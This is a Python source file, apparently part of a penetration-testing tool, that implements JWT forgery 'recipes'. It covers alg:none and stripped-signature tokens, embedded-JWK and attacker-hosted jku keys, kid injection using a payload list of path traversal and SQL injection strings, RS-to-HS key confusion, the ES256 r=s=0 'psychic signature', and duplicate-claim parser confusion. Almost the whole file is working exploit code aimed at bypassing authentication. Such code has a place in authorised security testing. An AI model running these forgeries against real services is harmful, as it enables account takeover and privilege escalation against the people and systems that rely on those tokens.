"""High-level JWT attack recipes.

Each recipe returns (header, payload, token, extra). `extra` may carry
generated key material, JWKS dicts, or notes useful to the report.
"""

from __future__ import annotations

import json
from typing import Any, Iterable

from .codec import JWTError, b64url_encode, decode_jwt, json_encode
from .keys import (
    gen_ec,
    gen_rsa,
    load_pem,
    private_pem,
    pub_to_jwk,
    public_pem,
)
from .sign import sign
from .transform import transform_payload


KID_PAYLOADS = [
    "../../../../dev/null",
    "/dev/null",
    "../../../../../../etc/passwd",
    "' UNION SELECT 'x'--",
    "' OR '1'='1",
    "\x00",
    "../../../../tmp/empty",
]


def _prep(token: str, sets, removes, merge_json, presets=None):
    header, payload, _ = decode_jwt(token)
    new_payload = transform_payload(
        payload, sets=sets, removes=removes, merge_json=merge_json, presets=presets
    )
    return header, new_payload


def forge_none(
    token: str,
    *,
    sets: Iterable[tuple[str, str]] | None = None,
    removes: Iterable[str] | None = None,
    merge_json: dict | None = None,
    presets: Iterable[str] | None = None,
    alg_literal: str = "none",
    keep_header_extras: bool = False,
    trailing_dot: bool = True,
) -> tuple[dict, dict, str, dict]:
    """Forge an alg:none JWT. `alg_literal` supports case-bypass variants."""
    header, new_payload = _prep(token, sets, removes, merge_json, presets)

    if keep_header_extras:
        new_header = {k: v for k, v in header.items() if k != "alg"}
        new_header = {"alg": alg_literal, **new_header}
        new_header["alg"] = alg_literal
        new_header.setdefault("typ", "JWT")
    else:
        new_header = {"alg": alg_literal, "typ": "JWT"}

    h_seg = b64url_encode(json_encode(new_header))
    p_seg = b64url_encode(json_encode(new_payload))
    out = f"{h_seg}.{p_seg}." if trailing_dot else f"{h_seg}.{p_seg}"
    return new_header, new_payload, out, {"alg_literal": alg_literal}


def forge_signed(
    token: str,
    *,
    alg: str,
    key,
    sets: Iterable[tuple[str, str]] | None = None,
    removes: Iterable[str] | None = None,
    merge_json: dict | None = None,
    presets: Iterable[str] | None = None,
    header_extras: dict | None = None,
    kid: str | None = None,
    keep_header_extras: bool = False,
) -> tuple[dict, dict, str, dict]:
    """Re-sign a token under any supported alg."""
    header, new_payload = _prep(token, sets, removes, merge_json, presets)

    if keep_header_extras:
        new_header = {k: v for k, v in header.items() if k != "alg"}
    else:
        new_header = {"typ": header.get("typ", "JWT")}
    if header_extras:
        new_header.update(header_extras)
    if kid is not None:
        new_header["kid"] = kid

    out = sign(new_header, new_payload, alg, key)
    new_header["alg"] = alg
    return new_header, new_payload, out, {}


def forge_jwk_embed(
    token: str,
    *,
    alg: str = "RS256",
    sets: Iterable[tuple[str, str]] | None = None,
    removes: Iterable[str] | None = None,
    merge_json: dict | None = None,
    presets: Iterable[str] | None = None,
) -> tuple[dict, dict, str, dict]:
    """Embed a freshly-generated public JWK in the header and sign with the private."""
    _, new_payload = _prep(token, sets, removes, merge_json, presets)

    if alg.startswith("RS") or alg.startswith("PS"):
        priv = gen_rsa()
    elif alg.startswith("ES"):
        priv = gen_ec(alg)
    else:
        raise JWTError(f"jwk-embed: alg {alg} has no asymmetric key")

    jwk = pub_to_jwk(priv)
    new_header = {"typ": "JWT", "jwk": jwk, "kid": jwk["kid"]}
    out = sign(new_header, new_payload, alg, priv)
    new_header["alg"] = alg
    return new_header, new_payload, out, {
        "private_pem": private_pem(priv).decode("ascii"),
        "public_pem": public_pem(priv).decode("ascii"),
        "jwk": jwk,
    }


def forge_jku(
    token: str,
    *,
    jku_url: str,
    alg: str = "RS256",
    sets: Iterable[tuple[str, str]] | None = None,
    removes: Iterable[str] | None = None,
    merge_json: dict | None = None,
    presets: Iterable[str] | None = None,
) -> tuple[dict, dict, str, dict]:
    """Generate a keypair, set `jku` to the supplied URL, sign with the private.

    `extra` includes a JWKS dict to host at `jku_url`, plus the private PEM.
    """
    _, new_payload = _prep(token, sets, removes, merge_json, presets)

    if alg.startswith("RS") or alg.startswith("PS"):
        priv = gen_rsa()
    elif alg.startswith("ES"):
        priv = gen_ec(alg)
    else:
        raise JWTError(f"jku: alg {alg} has no asymmetric key")

    jwk = pub_to_jwk(priv)
    new_header = {"typ": "JWT", "jku": jku_url, "kid": jwk["kid"]}
    out = sign(new_header, new_payload, alg, priv)
    new_header["alg"] = alg
    jwks = {"keys": [jwk]}
    return new_header, new_payload, out, {
        "private_pem": private_pem(priv).decode("ascii"),
        "jwks": jwks,
        "jwks_json": json.dumps(jwks, indent=2),
        "host_at": jku_url,
    }


def forge_kid(
    token: str,
    *,
    kid_value: str,
    secret: bytes | str = b"",
    alg: str = "HS256",
    sets: Iterable[tuple[str, str]] | None = None,
    removes: Iterable[str] | None = None,
    merge_json: dict | None = None,
    presets: Iterable[str] | None = None,
) -> tuple[dict, dict, str, dict]:
    """Inject an arbitrary `kid` and HS-sign with `secret` (default empty)."""
    _, new_payload = _prep(token, sets, removes, merge_json, presets)
    if not alg.startswith("HS"):
        raise JWTError("forge_kid only signs with HS* algs")

    new_header = {"typ": "JWT", "kid": kid_value}
    out = sign(new_header, new_payload, alg, secret)
    new_header["alg"] = alg
    return new_header, new_payload, out, {"kid": kid_value, "secret_was_empty": not bool(secret)}


def forge_rs_to_hs_confusion(
    token: str,
    *,
    public_pem: bytes | str,
    hs_alg: str = "HS256",
    sets: Iterable[tuple[str, str]] | None = None,
    removes: Iterable[str] | None = None,
    merge_json: dict | None = None,
    presets: Iterable[str] | None = None,
) -> tuple[dict, dict, str, dict]:
    """HS-sign using the supplied RSA/EC public PEM as the HMAC secret.

    Returns the raw-PEM variant in `token` and the normalized variant in
    `extra['token_normalized']`. Vulnerable verifiers reuse the PEM bytes
    as the HMAC key when they accept the attacker-chosen `alg=HS*`.
    """
    _, new_payload = _prep(token, sets, removes, merge_json, presets)
    if not hs_alg.startswith("HS"):
        raise JWTError("rs-to-hs requires an HS* alg")

    pem = public_pem.encode("utf-8") if isinstance(public_pem, str) else public_pem
    pem_normalized = b"\n".join(line.strip() for line in pem.splitlines() if line.strip()) + b"\n"

    new_header = {"typ": "JWT"}
    tok_raw = sign(dict(new_header), new_payload, hs_alg, pem)
    tok_norm = sign(dict(new_header), new_payload, hs_alg, pem_normalized)
    new_header["alg"] = hs_alg
    return new_header, new_payload, tok_raw, {
        "token_raw_pem": tok_raw,
        "token_normalized": tok_norm,
        "secret_raw": pem.decode("ascii", errors="replace"),
        "secret_normalized": pem_normalized.decode("ascii", errors="replace"),
    }


def forge_strip_signature(
    token: str,
    *,
    alg_literal: str | None = None,
    sets: Iterable[tuple[str, str]] | None = None,
    removes: Iterable[str] | None = None,
    merge_json: dict | None = None,
    presets: Iterable[str] | None = None,
    trailing_dot: bool = False,
    keep_header_extras: bool = True,
) -> tuple[dict, dict, str, dict]:
    """Keep header (optionally rewriting `alg`), keep payload, empty signature."""
    header, new_payload = _prep(token, sets, removes, merge_json, presets)

    if keep_header_extras:
        new_header = dict(header)
    else:
        new_header = {"typ": header.get("typ", "JWT"), "alg": header.get("alg", "none")}
    if alg_literal is not None:
        new_header["alg"] = alg_literal

    h_seg = b64url_encode(json_encode(new_header))
    p_seg = b64url_encode(json_encode(new_payload))
    out = f"{h_seg}.{p_seg}." if trailing_dot else f"{h_seg}.{p_seg}"
    return new_header, new_payload, out, {}


def forge_psychic_es256(
    token: str,
    *,
    sets: Iterable[tuple[str, str]] | None = None,
    removes: Iterable[str] | None = None,
    merge_json: dict | None = None,
    presets: Iterable[str] | None = None,
) -> tuple[dict, dict, str, dict]:
    """ES256 with r=s=0 — the 'psychic signature' that some libs accept."""
    _, new_payload = _prep(token, sets, removes, merge_json, presets)

    new_header = {"alg": "ES256", "typ": "JWT"}
    h_seg = b64url_encode(json_encode(new_header))
    p_seg = b64url_encode(json_encode(new_payload))
    sig = b"\x00" * 64
    out = f"{h_seg}.{p_seg}.{b64url_encode(sig)}"
    return new_header, new_payload, out, {"note": "r=s=0 ES256 — CVE-2022-21449 class"}


def forge_duplicate_claim(
    token: str,
    *,
    key: str,
    values: list[Any],
    sets: Iterable[tuple[str, str]] | None = None,
    removes: Iterable[str] | None = None,
    merge_json: dict | None = None,
    presets: Iterable[str] | None = None,
    alg_literal: str = "none",
) -> tuple[dict, dict, str, dict]:
    """Produce a payload with the same JSON key encoded twice (parser confusion).

    Built by raw string assembly since `json` collapses duplicate keys.
    Signed as alg:none to keep the recipe self-contained.
    """
    header, new_payload = _prep(token, sets, removes, merge_json, presets)
    new_payload.pop(key, None)

    base = json.dumps(new_payload, separators=(",", ":"), ensure_ascii=False)
    inner = ",".join(
        f"{json.dumps(key)}:{json.dumps(v, ensure_ascii=False)}" for v in values
    )
    if base == "{}":
        raw = "{" + inner + "}"
    else:
        raw = base[:-1] + "," + inner + "}"

    new_header = {"alg": alg_literal, "typ": "JWT"}
    h_seg = b64url_encode(json_encode(new_header))
    p_seg = b64url_encode(raw.encode("utf-8"))
    out = f"{h_seg}.{p_seg}."
    # Surface the last value as the "logical" payload for reporting.
    logical = dict(new_payload)
    if values:
        logical[key] = values[-1]
    return new_header, logical, out, {"raw_payload_json": raw}
